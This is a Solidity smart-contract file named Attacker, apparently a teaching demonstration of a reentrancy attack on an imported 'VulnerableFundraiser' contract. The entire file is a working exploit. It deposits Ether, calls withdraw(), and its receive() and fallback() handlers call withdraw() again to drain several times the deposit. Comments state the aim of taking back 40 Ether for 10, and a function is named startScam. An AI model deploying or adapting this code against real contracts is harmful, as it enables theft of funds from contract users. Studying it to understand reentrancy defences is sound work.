pragma solidity ^0.8.0;

//the attacker needs to know the structure of fundrasier contract
//needs to define a withdraw times to avoid reach gas limit and make the transaction reversed

import './VulnerableFundraiser.sol';

contract Attacker{
    address public fundrasierAddress;
    uint public drainTimes = 0; //drainTimes = 3, means if I contribute 10 Ether, I want to get 40 Ether back
    
    constructor(address victimAddress){
        fundrasierAddress = victimAddress;
    }
    
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
    
    function payMe() public payable{
        Fundraiser(fundrasierAddress).contribute{value:msg.value}(); // execute the function immediately
    }
    
    function startScam() public{
        Fundraiser(fundrasierAddress).withdraw();
    }
    
    // Function to receive Ether. msg.data must be empty
    receive() external payable {
        if (drainTimes<3){
            drainTimes++;
            Fundraiser(fundrasierAddress).withdraw();
        }
    }
 
    // Fallback function is called when msg.data is not empty
    fallback() external payable {
        if (drainTimes<3){
            drainTimes++;
            Fundraiser(fundrasierAddress).withdraw();
        }
    }
}